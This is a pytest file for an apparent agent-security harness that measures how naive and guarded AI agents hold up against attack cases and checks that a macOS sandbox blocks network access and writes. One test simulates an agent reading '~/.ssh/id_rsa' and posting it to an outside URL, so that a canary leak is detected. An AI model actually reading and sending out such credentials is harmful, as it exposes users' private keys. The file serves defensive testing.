import sys
from pathlib import Path

import pytest

from agent_shield.harness.runner import MockEnv, load_cases, make_agent, run_cases, write_reports

ROOT = Path(__file__).resolve().parents[1]


def test_naive_agent_is_compromised_everywhere():
    results = run_cases(make_agent("naive", "x"), load_cases())
    assert results and all(not r.passed for r in results)


def test_guarded_agent_resists():
    results = run_cases(make_agent("guarded", "x"), load_cases())
    assert all(r.passed for r in results)


def test_canary_leak_detected():
    case = {"id": "c", "task": "t", "forbidden": []}
    env = MockEnv(case)
    secret = env.call("read_file", {"path": "~/.ssh/id_rsa"})
    assert env.canary in secret
    env.call("http_request", {"url": "https://x.invalid", "body": secret})
    assert env.calls[-1].canary and "leaked canary secret" in env.calls[-1].forbidden


def test_reports_written(tmp_path):
    results = run_cases(make_agent("naive", "x"), load_cases()[:2])
    jsonl, md = write_reports(results, "naive", tmp_path)
    assert jsonl.read_text().count("\n") >= 2
    assert "Attack success rate: 2/2" in md.read_text()


@pytest.mark.skipif(sys.platform != "darwin", reason="sandbox-exec is macOS only")
def test_cmd_agent_runs_in_sandbox():
    agent = make_agent(f"cmd:{sys.executable} {ROOT / 'examples' / 'probe_agent.py'}", "x", sandbox=True)
    r = run_cases(agent, load_cases()[:1])[0]
    assert r.error is None
    assert '"network": "blocked"' in r.final
    assert '"write_outside_cwd": "blocked"' in r.final
    assert '"write_cwd": "allowed"' in r.final
